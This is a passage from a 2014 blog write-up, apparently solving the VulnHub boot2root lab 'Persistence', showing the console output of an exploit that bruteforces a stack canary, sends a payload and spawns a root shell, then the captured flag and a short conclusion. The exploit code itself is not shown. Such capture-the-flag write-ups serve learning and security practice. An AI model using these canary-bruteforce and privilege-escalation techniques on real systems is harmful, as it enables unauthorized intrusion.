</span><span class='line'>    <span class="o">(</span>   <span class="se">\_</span> <span class="p">|</span>  o  <span class="o">)</span> <span class="p">|</span>    <span class="p">|</span>     <span class="o">||</span>  <span class="p">|</span> <span class="p">|</span>      <span class="p">|</span>
</span><span class='line'>     <span class="se">\_</span>_  <span class="o">||</span>   _/<span class="p">|</span> <span class="p">|</span>___ <span class="p">|</span>  O  <span class="o">||</span>  <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>  <span class="p">|</span>_<span class="p">|</span>
</span><span class='line'>     /  <span class="se">\ </span><span class="o">||</span>  <span class="p">|</span>  <span class="p">|</span>     <span class="o">||</span>     <span class="o">||</span>  <span class="p">|</span>   <span class="p">|</span>  <span class="p">|</span>
</span><span class='line'>     <span class="se">\ </span>   <span class="o">||</span>  <span class="p">|</span>  <span class="p">|</span>     <span class="o">||</span>     <span class="o">||</span>  <span class="p">|</span>   <span class="p">|</span>  <span class="p">|</span>
</span><span class='line'>      <span class="se">\_</span>__<span class="o">||</span>__<span class="p">|</span>  <span class="p">|</span>_____<span class="p">|</span> <span class="se">\_</span>__/<span class="p">|</span>____<span class="p">|</span>  <span class="p">|</span>__<span class="p">|</span>
</span><span class='line'>
</span><span class='line'>                A: <span class="s2">&quot;AKA: FU superkojiman &amp;&amp; sagi- !!&quot;</span>
</span><span class='line'>                A: <span class="s2">&quot;I also have no idea what I am doing&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Connecting <span class="p">&amp;</span> starting canary bruteforce...
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;64&#39;</span>!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;d3&#39;</span>!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;c6&#39;</span>!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;15&#39;</span>!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Canary known as : 64d3c615
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Writing /tmp/log to be called by wopr later
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Connecting to service
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Sending Payload
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Done
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> going to try and spawn /tmp/getroot, assuming the sploit worked :<span class="o">)</span>
</span><span class='line'>sh-4.1# id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>500<span class="o">(</span>avida<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,500<span class="o">(</span>avida<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span></code></pre></td></tr></table></div></figure>


<p>And, as proof, we cat the flag!</p>

<figure class='code'><figcaption><span>Persistence w00t</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sh-4.1# cat /root/flag.txt
</span><span class='line'>              .d8888b.  .d8888b. 888
</span><span class='line'>             d88P  Y88bd88P  Y88b888
</span><span class='line'>             888    888888    888888
</span><span class='line'>888  888  888888    888888    888888888
</span><span class='line'>888  888  888888    888888    888888
</span><span class='line'>888  888  888888    888888    888888
</span><span class='line'>Y88b 888 d88PY88b  d88PY88b  d88PY88b.
</span><span class='line'> <span class="s2">&quot;Y8888888P&quot;</span>  <span class="s2">&quot;Y8888P&quot;</span>  <span class="s2">&quot;Y8888P&quot;</span>  <span class="err">&quot;</span>Y888
</span><span class='line'>
</span><span class='line'>Congratulations!!! You have the flag!
</span><span class='line'>
</span><span class='line'>We had a great <span class="nb">time </span>coming up with the
</span><span class='line'>challenges <span class="k">for </span>this boot2root, and we
</span><span class='line'>hope that you enjoyed overcoming them.
</span><span class='line'>
</span><span class='line'>Special thanks goes out to @VulnHub <span class="k">for </span>
</span><span class='line'>hosting Persistence <span class="k">for </span>us, and to
</span><span class='line'>@recrudesce <span class="k">for </span>testing and providing
</span><span class='line'>valuable feedback!
</span><span class='line'>
</span><span class='line'>Until next <span class="nb">time</span>,
</span><span class='line'>      sagi- <span class="p">&amp;</span> superkojiman
</span></code></pre></td></tr></table></div></figure>


<h2>conclusion</h2>

<p>Persistence kicked ass!! I learned a ton and that is the ultimate win. Thanks sagi- &amp;&amp; superkojiman for an incredible challenge! Thanks Vulnhub for the hosting and community!</p>

<h2>thats not all</h2>

<p>There are however a few more things I&rsquo;d like to try.</p>

<ul>
<li>Find if and how we can root Persistence using <code>sysadmin-tool</code></li>
<li>Modify the exploit to a working ROP payload</li>
<li>Explore other avenues to break out of rbash</li>
</ul>

</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/2">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">knock-knock who’s there?</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/10/another-troll-tamed-solving-troll-2/">another troll tamed - solving troll 2</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/09/18/from-persistence/">From Persistence, to pain, to PWN</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/17/kali-linux-oracle-support/">Kali Linux Oracle Support</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/15/taming-the-troll/">taming (actually just solving) the troll</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/09/beating-xerxes2/">Beating Xerxes 2 (no, not the Persian King)</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/07/flick-can-you-find-the-flag/">flick - can you find the flag?</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/07/20/hell-would-just-not-freeze-over/">Hell would just not freeze over!</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/07/17/climbing-the-skytower/">Climbing the SkyTower</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/">dnsfilexfer - yet another take on file transfer via DNS</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating&#8230;</li>
  </ul>
  
  <a href="https://github.com/leonjza">@leonjza</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'leonjza',
            count: 8,
            skip_forks: true,
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2014 - Leon Jacobs -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
